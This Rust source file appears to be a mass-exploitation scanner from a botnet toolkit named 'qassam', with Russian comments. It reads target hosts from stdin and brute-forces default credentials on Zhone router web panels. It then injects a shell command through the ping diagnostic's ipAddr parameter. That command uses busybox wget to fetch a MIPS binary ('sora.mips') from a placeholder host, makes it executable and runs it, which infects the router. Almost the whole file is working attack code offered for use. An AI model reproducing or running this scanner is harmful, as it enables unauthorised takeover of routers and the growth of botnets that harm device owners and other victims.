use std::sync::{
    atomic::{AtomicI32, Ordering},
    Arc,
};
use std::sync::atomic::AtomicU32;
use std::time::Duration;
use tokio::time::{sleep, timeout};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use base64::{Engine as _, engine::general_purpose};
use clap::Parser;
use colored::*;
use rand::prelude::*;
use tokio::io::AsyncBufReadExt;
use colored::*;

use qassam::support::qassam_support::{qassam_zero_byte, qassam_set_write_timeout, qassam_set_read_timeout, qassam_get_string_in_between};

// Global variables (atomic for thread safety)
static QASSAM_ZONE_STATUS_ATTEMPTED: AtomicI32 = AtomicI32::new(0);
static QASSAM_ZONE_STATUS_LOGINS: AtomicI32 = AtomicI32::new(0);
static QASSAM_ZONE_STATUS_FOUND: AtomicI32 = AtomicI32::new(0);
static QASSAM_ZONE_STATUS_VULN: AtomicI32 = AtomicI32::new(0);

// Waiting time constants
const QASSAM_ZONE_CONNECT_TIMEOUT_SECS: u64 = 30;
const QASSAM_ZONE_READ_TIMEOUT_SECS: u64 = 15;
const QASSAM_ZONE_WRITE_TIMEOUT_SECS: u64 = 10;

static QASSAM_ZONE_ATTEMPTED: AtomicU32 = AtomicU32::new(0);
static QASSAM_ZONE_FOUND: AtomicU32 = AtomicU32::new(0);
static QASSAM_ZONE_VULN: AtomicU32 = AtomicU32::new(0);

const QASSAM_ZONE_CONNECT_TIMEOUT: Duration = Duration::from_secs(30);
const QASSAM_ZONE_READ_TIMEOUT: Duration = Duration::from_secs(15);
const QASSAM_ZONE_WRITE_TIMEOUT: Duration = Duration::from_secs(10);

// URL and data constants
const QASSAM_ZONE_PAYLOAD_ENCODED: &str = "/bin/busybox%20wget%20http://YOURIP/bins/sora.mips%20-O%20/var/g;%20chmod%20777%20/var/g;%20/var/g%20zhone";
const QASSAM_ZONE_LOGINS: &[&str] = &[
    "admin:admin", "admin:cciadmin", "Admin:Admin", "user:user",
    "admin:zhone", "vodafone:vodafone"
];

const QASSAM_ZONE_LOGIN_CREDS: &[&str] = &[
    "admin:admin", "admin:cciadmin", "Admin:Admin",
    "user:user", "admin:zhone", "vodafone:vodafone"
];



#[derive(Clone)]
struct QassamZhoneScanner {
    encoded_logins: Vec<String>,
}


#[derive(Parser, Debug, Clone)]
#[command(author, version, about)]
pub struct QassamArgs {
    #[arg(index = 1)]
    pub port_or_listen: String,
}


impl QassamZhoneScanner {
    pub fn new() -> Self {
        let encoded_logins = QASSAM_ZONE_LOGIN_CREDS // Используем переименованную константу
            .iter()
            .map(|&cred| general_purpose::STANDARD.encode(cred))
            .collect();

        Self { encoded_logins }
    }

    pub async fn scan_target(&self, target: String) -> Result<ScanResult, Box<dyn std::error::Error>> {
        QASSAM_ZONE_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);

        let mut result = ScanResult {
            target: target.clone(),
            requires_auth: false,
            authenticated: false,
            session_key: None,
            vulnerable: false,
            error: None,
        };

        // Шаг 1: Проверка аутентификации
        match self.check_auth_required(&target).await {
            Ok(requires_auth) => {
                result.requires_auth = requires_auth;
                if !requires_auth {
                    return Ok(result);
                }
                QASSAM_ZONE_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
            }
            Err(e) => {
                result.error = Some(format!("Auth check failed: {}", e));
                return Ok(result);
            }
        }

        // Шаг 2: Подбор учетных данных
        let (session_key, auth_index) = match self.authenticate(&target).await {
            Ok((session, index)) => (session, index),
            Err(e) => {
                result.error = Some(format!("Authentication failed: {}", e));
                return Ok(result);
            }
        };

        if session_key.is_none() {
            result.error = Some("No valid credentials found".to_string());
            return Ok(result);
        }

        result.authenticated = true;
        result.session_key = session_key.clone();
        QASSAM_ZONE_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed); // Работает с атомарным счетчиком

        // Шаг 3: Эксплойт
        match self.exploit(&target, &self.encoded_logins[auth_index], &session_key.unwrap()).await {
            Ok(vulnerable) => {
                result.vulnerable = vulnerable;
                if vulnerable {
                    QASSAM_ZONE_STATUS_VULN.fetch_add(1, Ordering::Relaxed);
                }
            }
            Err(e) => {
                result.error = Some(format!("Exploit failed: {}", e));
            }
        }

        Ok(result)
    }

    async fn check_auth_required(&self, target: &str) -> Result<bool, Box<dyn std::error::Error>> {
        let mut stream = TcpStream::connect(target).await?;
        stream.set_nodelay(true)?;

        let request = format!(
            "GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n",
            target
        );

        let response = self.send_request(&mut stream, &request).await?;
        Ok(response.contains("401 Unauthorized") && response.contains("Basic realm="))
    }

    async fn authenticate(&self, target: &str) -> Result<(Option<String>, usize), Box<dyn std::error::Error>> {
        for (i, login) in self.encoded_logins.iter().enumerate() {
            let mut stream = TcpStream::connect(target).await?;
            stream.set_nodelay(true)?;

            let request = format!(
                "GET /zhnping.html HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://{}/menu.html\r\nAuthorization: Basic {}\r\n\r\n",
                target, target, login
            );

            let response = self.send_request(&mut stream, &request).await?;

            if response.contains("HTTP/1.1 200") || response.contains("HTTP/1.0 200") {
                let session_key = self.extract_session_key(&response);
                return Ok((session_key, i));
            }
        }

        Err("No valid credentials found".into())
    }

    async fn exploit(&self, target: &str, auth_header: &str, session_key: &str) -> Result<bool, Box<dyn std::error::Error>> {
        let mut stream = TcpStream::connect(target).await?;
        stream.set_nodelay(true)?;

        let request = format!(
            "GET /zhnping.cmd?&test=ping&sessionKey={}&ipAddr=1.1.1.1;{}&count=4&length=64 HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Intel Mac OS X 10.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 Edg/81.0.416.72\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://{}/diag.html\r\nAuthorization: Basic {}\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n",
            session_key, QASSAM_ZONE_PAYLOAD_ENCODED, target, target, auth_header
        );

        let response = self.send_request(&mut stream, &request).await?;
        Ok(response.contains("/var/pinglog"))
    }

    async fn send_request(&self, stream: &mut TcpStream, request: &str) -> Result<String, Box<dyn std::error::Error>> {
        stream.write_all(request.as_bytes()).await?;

        let mut buffer = vec![0u8; 4096];
        let n = stream.read(&mut buffer).await?;

        Ok(String::from_utf8_lossy(&buffer[..n]).to_string())
    }

    fn extract_session_key(&self, response: &str) -> Option<String> {
        let pattern = "var sessionKey='";
        if let Some(start) = response.find(pattern) {
            let start_idx = start + pattern.len();
            if let Some(end) = response[start_idx..].find("';") {
                return Some(response[start_idx..start_idx + end].to_string());
            }
        }
        None
    }
}

#[derive(Debug, Clone)]
struct ScanResult {
    pub target: String,
    pub requires_auth: bool,
    pub authenticated: bool,
    pub session_key: Option<String>,
    pub vulnerable: bool,
    pub error: Option<String>,
}

async fn qassam_zone_print_stats() {
    let mut i = 0;
    loop {
        tokio::time::sleep(Duration::from_secs(1)).await;
        i += 1;

        println!(
            "[{}] {}'s | {}: {} | {}: {} | {}: {} | {}: {}",
            "ETA".cyan(),
            i,
            "Attempted".blue(), QASSAM_ZONE_STATUS_ATTEMPTED.load(Ordering::Relaxed),
            "Found".yellow(), QASSAM_ZONE_STATUS_FOUND.load(Ordering::Relaxed),
            "Logins".green(), QASSAM_ZONE_STATUS_LOGINS.load(Ordering::Relaxed), // Теперь работает
            "Vulnerable".red(), QASSAM_ZONE_STATUS_VULN.load(Ordering::Relaxed)
        );
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = QassamArgs::parse();
    let scanner = QassamZhoneScanner::new();

    tokio::spawn(qassam_zone_print_stats());

    let mut lines = tokio::io::BufReader::new(tokio::io::stdin()).lines();

    while let Some(line) = lines.next_line().await? {
        let target = line.trim();
        if target.is_empty() {
            continue;
        }

        let target_with_port = if args.port_or_listen == "listen" {
            target.to_string()
        } else {
            format!("{}:{}", target, args.port_or_listen)
        };

        let scanner_clone = scanner.clone();

        tokio::spawn(async move {
            match scanner_clone.scan_target(target_with_port.clone()).await {
                Ok(result) => {
                    if result.vulnerable {
                        println!("[{}] {} - VULNERABLE!", "SUCCESS".green(), result.target);
                    } else if result.authenticated {
                        println!("[{}] {} - Authenticated but not vulnerable", "INFO".blue(), result.target);
                    }
                }
                Err(e) => {
                    eprintln!("[{}] {} - Error: {}", "ERROR".red(), target_with_port, e);
                }
            }
        });
    }

    tokio::time::sleep(Duration::from_secs(5)).await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extract_session_key() {
        let scanner = QassamZhoneScanner::new();

        let response = "some data var sessionKey='test123'; more data";
        assert_eq!(scanner.extract_session_key(response), Some("test123".to_string()));

        let response_no_key = "some data without session key";
        assert_eq!(scanner.extract_session_key(response_no_key), None);
    }

    #[test]
    fn test_atomic_counters() {
        // Reset counters - теперь все работают с атомарными счетчиками
        QASSAM_ZONE_STATUS_ATTEMPTED.store(0, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_FOUND.store(0, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_LOGINS.store(0, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_VULN.store(0, Ordering::Relaxed);

        // Increment counters - теперь все работают
        QASSAM_ZONE_STATUS_ATTEMPTED.fetch_add(1, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_FOUND.fetch_add(1, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_LOGINS.fetch_add(1, Ordering::Relaxed);
        QASSAM_ZONE_STATUS_VULN.fetch_add(1, Ordering::Relaxed);

        // Check values - теперь все работают
        assert_eq!(QASSAM_ZONE_STATUS_ATTEMPTED.load(Ordering::Relaxed), 1);
        assert_eq!(QASSAM_ZONE_STATUS_FOUND.load(Ordering::Relaxed), 1);
        assert_eq!(QASSAM_ZONE_STATUS_LOGINS.load(Ordering::Relaxed), 1);
        assert_eq!(QASSAM_ZONE_STATUS_VULN.load(Ordering::Relaxed), 1);
    }

    #[test]
    fn test_scanner_clone() {
        let scanner = QassamZhoneScanner::new();
        let cloned = scanner.clone();
        assert_eq!(scanner.encoded_logins.len(), cloned.encoded_logins.len());
    }

    #[test]
    fn test_login_encoding() {
        let scanner = QassamZhoneScanner::new();
        let admin_admin = general_purpose::STANDARD.encode("admin:admin");
        assert!(scanner.encoded_logins.contains(&admin_admin));
        assert_eq!(scanner.encoded_logins.len(), QASSAM_ZONE_LOGIN_CREDS.len());
    }

    #[tokio::test]
    async fn test_scan_result_structure() {
        let result = ScanResult {
            target: "test:80".to_string(),
            requires_auth: true,
            authenticated: true,
            session_key: Some("test_key".to_string()),
            vulnerable: true,
            error: None,
        };

        assert_eq!(result.target, "test:80");
        assert!(result.requires_auth);
        assert!(result.authenticated);
        assert!(result.vulnerable);
        assert_eq!(result.session_key, Some("test_key".to_string()));
        assert!(result.error.is_none());
    }
}